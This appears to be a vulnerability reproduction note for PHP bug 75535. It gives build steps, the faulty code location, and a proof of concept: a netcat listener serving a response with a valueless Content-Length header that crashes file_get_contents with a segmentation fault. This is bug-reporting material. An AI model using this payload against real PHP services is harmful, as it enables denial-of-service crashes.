ubuntu 14.04success 20.04fail
Version：补丁的前一个Version1ed08f9877b224b51078a0993f7faf52d432f4bd
The issue has been introduced in https://github.com/php/php-src/commit/5146d9f8ac170d8ba7109370d732d56dc0777578, which landed in PHP 7.0.16, PHP 7.1.2 and PHP 7.2-dev. It does not affect PHP 5.6.
git checkout 1ed08f9877b224b51078a0993f7faf52d432f4bd

## Compilation process
git clone git@github.com:php/php-src.git
cd php-src
git checkout php-7.0.6
apt update
apt install -y make gcc autoconf bison re2c libxml2-dev
./configure
make -j$(nproc)
make install


## pocTrigger process

I fuzzed the HTTP parsing function in the latest version of PHP and found a segment fault. It is very easy to trigger this segment fault and may be vulnerable in some scenarios.

In `ext/standard/http_fopen_wrapper.c#L801`

`http_header_value` can be a NULL value. so the `atoi(NULL)` will lead to segment fault!

https://github.com/php/php-src/blob/9fbb019848cbb0387cb7267489dd91ebb4d9050e/ext/standard/http_fopen_wrapper.c#L801

Test script:
---------------
# cat poc
HTTP/1.1 200 OK
Content-Length

# nc -vvlp 80 < poc &
# php -r 'file_get_contents("http://localhost/");'
Segmentation fault


https://bugs.php.net/bug.php?id=75535